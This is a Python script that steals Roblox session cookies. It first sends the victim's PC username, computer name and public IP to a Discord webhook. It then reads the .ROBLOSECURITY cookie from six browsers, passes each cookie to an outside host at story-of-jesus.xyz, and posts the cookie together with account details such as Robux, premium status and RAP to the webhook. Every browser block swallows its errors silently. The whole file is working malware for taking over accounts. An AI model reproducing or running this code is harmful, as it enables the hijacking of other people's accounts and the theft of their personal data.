

import browser_cookie3
from discord_webhook import DiscordWebhook, DiscordEmbed
import requests
import os
from urllib.request import Request, urlopen
import json

webhooky = "YOURWEBHOOK"



def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

def shit(): #eh ur gona see ;))
         pc_username = os.getenv("UserName")
         pc_name = os.getenv("COMPUTERNAME")
         ip = getip()
         requests.post(webhooky,json={"content": f"PC username: `{pc_username}` \nPC name: `{pc_name}` \nIP: `{ip}`"})

shit()

try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
        id = r['userid']
        User = r['username']
        rob = r['robux']
        av = r['avatarurl']
        pr = r['premium']
        ve = r['emailverified']
        rap = r['rap']
        prof = f"https://www.roblox.com/users/{id}/profile"
        content = "@everyone"
        webhook = DiscordWebhook(url=webhooky, username="kk$ 0.2", avatar_url=r"https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png",content=content)
        embed = DiscordEmbed(title="PROFILE", description=f"Roblox Cookie", color='5200FF',url=av)
        embed.set_author(name="author : kk4", icon_url=r'https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_footer(text='wut this')
        embed.set_image(url='https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_timestamp()
        embed.set_thumbnail(url=av)
        embed.add_embed_field(name="-", value=f"ID:```{id}```", ineline=True)
        embed.add_embed_field(name="-", value=f"USER:```{User}```",ineline=True)
        embed.add_embed_field(name="-", value=f"ROBUX:```{rob}```",ineline=True)
        embed.add_embed_field(name="-", value=f"PREMIUM:```{pr}```",ineline=True)
        embed.add_embed_field(name="-", value=f"VERIFIED:```{ve}```",ineline=True)
        embed.add_embed_field(name="-", value=f"RAP:```{rap}```",ineline=True)
        embed.add_embed_field(name="Cookie :", value=f"```{cookie}```",ineline=False)
        webhook.add_embed(embed)
        response = webhook.execute()
except:
     pass

try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
        id = r['userid']
        User = r['username']
        rob = r['robux']
        av = r['avatarurl']
        pr = r['premium']
        ve = r['emailverified']
        rap = r['rap']
        prof = f"https://www.roblox.com/users/{id}/profile"
        content = "@everyone"
        webhook = DiscordWebhook(url=webhooky, username="kk$ 0.2", avatar_url=r"https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png",content=content)
        embed = DiscordEmbed(title="PROFILE", description=f"Roblox Cookie", color='5200FF',url=av)
        embed.set_author(name="author : kk4", icon_url=r'https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_footer(text='wut this')
        embed.set_image(url='https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_timestamp()
        embed.set_thumbnail(url=av)
        embed.add_embed_field(name="-", value=f"ID:```{id}```", ineline=True)
        embed.add_embed_field(name="-", value=f"USER:```{User}```",ineline=True)
        embed.add_embed_field(name="-", value=f"ROBUX:```{rob}```",ineline=True)
        embed.add_embed_field(name="-", value=f"PREMIUM:```{pr}```",ineline=True)
        embed.add_embed_field(name="-", value=f"VERIFIED:```{ve}```",ineline=True)
        embed.add_embed_field(name="-", value=f"RAP:```{rap}```",ineline=True)
        embed.add_embed_field(name="Cookie :", value=f"```{cookie}```",ineline=False)
        webhook.add_embed(embed)
        response = webhook.execute()

except:
     pass



try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
        id = r['userid']
        User = r['username']
        rob = r['robux']
        av = r['avatarurl']
        pr = r['premium']
        ve = r['emailverified']
        rap = r['rap']
        prof = f"https://www.roblox.com/users/{id}/profile"
        content = "@everyone"
        webhook = DiscordWebhook(url=webhooky, username="kk$ 0.2", avatar_url=r"https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png",content=content)
        embed = DiscordEmbed(title="PROFILE", description=f"Roblox Cookie", color='5200FF',url=av)
        embed.set_author(name="author : kk4", icon_url=r'https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_footer(text='wut this')
        embed.set_image(url='https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_timestamp()
        embed.set_thumbnail(url=av)
        embed.add_embed_field(name="-", value=f"ID:```{id}```", ineline=True)
        embed.add_embed_field(name="-", value=f"USER:```{User}```",ineline=True)
        embed.add_embed_field(name="-", value=f"ROBUX:```{rob}```",ineline=True)
        embed.add_embed_field(name="-", value=f"PREMIUM:```{pr}```",ineline=True)
        embed.add_embed_field(name="-", value=f"VERIFIED:```{ve}```",ineline=True)
        embed.add_embed_field(name="-", value=f"RAP:```{rap}```",ineline=True)
        embed.add_embed_field(name="Cookie :", value=f"```{cookie}```",ineline=False)
        webhook.add_embed(embed)
        response = webhook.execute()

except:
     pass


try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
        id = r['userid']
        User = r['username']
        rob = r['robux']
        av = r['avatarurl']
        pr = r['premium']
        ve = r['emailverified']
        rap = r['rap']
        prof = f"https://www.roblox.com/users/{id}/profile"
        content = "@everyone"
        webhook = DiscordWebhook(url=webhooky, username="kk$ 0.2", avatar_url=r"https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png",content=content)
        embed = DiscordEmbed(title="PROFILE", description=f"Roblox Cookie", color='5200FF',url=av)
        embed.set_author(name="author : kk4", icon_url=r'https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_footer(text='wut this')
        embed.set_image(url='https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_timestamp()
        embed.set_thumbnail(url=av)
        embed.add_embed_field(name="-", value=f"ID:```{id}```", ineline=True)
        embed.add_embed_field(name="-", value=f"USER:```{User}```",ineline=True)
        embed.add_embed_field(name="-", value=f"ROBUX:```{rob}```",ineline=True)
        embed.add_embed_field(name="-", value=f"PREMIUM:```{pr}```",ineline=True)
        embed.add_embed_field(name="-", value=f"VERIFIED:```{ve}```",ineline=True)
        embed.add_embed_field(name="-", value=f"RAP:```{rap}```",ineline=True)
        embed.add_embed_field(name="Cookie :", value=f"```{cookie}```",ineline=False)
        webhook.add_embed(embed)
        response = webhook.execute()
except:
     pass

try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
        id = r['userid']
        User = r['username']
        rob = r['robux']
        av = r['avatarurl']
        pr = r['premium']
        ve = r['emailverified']
        rap = r['rap']
        prof = f"https://www.roblox.com/users/{id}/profile"
        content = "@everyone"
        webhook = DiscordWebhook(url=webhooky, username="kk$ 0.2", avatar_url=r"https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png",content=content)
        embed = DiscordEmbed(title="PROFILE", description=f"Roblox Cookie", color='5200FF',url=av)
        embed.set_author(name="author : kk4", icon_url=r'https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_footer(text='wut this')
        embed.set_image(url='https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_timestamp()
        embed.set_thumbnail(url=av)
        embed.add_embed_field(name="-", value=f"ID:```{id}```", ineline=True)
        embed.add_embed_field(name="-", value=f"USER:```{User}```",ineline=True)
        embed.add_embed_field(name="-", value=f"ROBUX:```{rob}```",ineline=True)
        embed.add_embed_field(name="-", value=f"PREMIUM:```{pr}```",ineline=True)
        embed.add_embed_field(name="-", value=f"VERIFIED:```{ve}```",ineline=True)
        embed.add_embed_field(name="-", value=f"RAP:```{rap}```",ineline=True)
        embed.add_embed_field(name="Cookie :", value=f"```{cookie}```",ineline=False)
        webhook.add_embed(embed)
        response = webhook.execute()
except:
     pass

try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
        id = r['userid']
        User = r['username']
        rob = r['robux']
        av = r['avatarurl']
        pr = r['premium']
        ve = r['emailverified']
        rap = r['rap']
        prof = f"https://www.roblox.com/users/{id}/profile"
        content = "@everyone"
        webhook = DiscordWebhook(url=webhooky, username="kk$ 0.2", avatar_url=r"https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png",content=content)
        embed = DiscordEmbed(title="PROFILE", description=f"Roblox Cookie", color='5200FF',url=av)
        embed.set_author(name="author : kk4", icon_url=r'https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_footer(text='wut this')
        embed.set_image(url='https://cdn.discordapp.com/attachments/987679465452748833/1013036218830827632/unknown.png')
        embed.set_timestamp()
        embed.set_thumbnail(url=av)
        embed.add_embed_field(name="-", value=f"ID:```{id}```", ineline=True)
        embed.add_embed_field(name="-", value=f"USER:```{User}```",ineline=True)
        embed.add_embed_field(name="-", value=f"ROBUX:```{rob}```",ineline=True)
        embed.add_embed_field(name="-", value=f"PREMIUM:```{pr}```",ineline=True)
        embed.add_embed_field(name="-", value=f"VERIFIED:```{ve}```",ineline=True)
        embed.add_embed_field(name="-", value=f"RAP:```{rap}```",ineline=True)
        embed.add_embed_field(name="Cookie :", value=f"```{cookie}```",ineline=False)
        webhook.add_embed(embed)
        response = webhook.execute()
except:
     pass



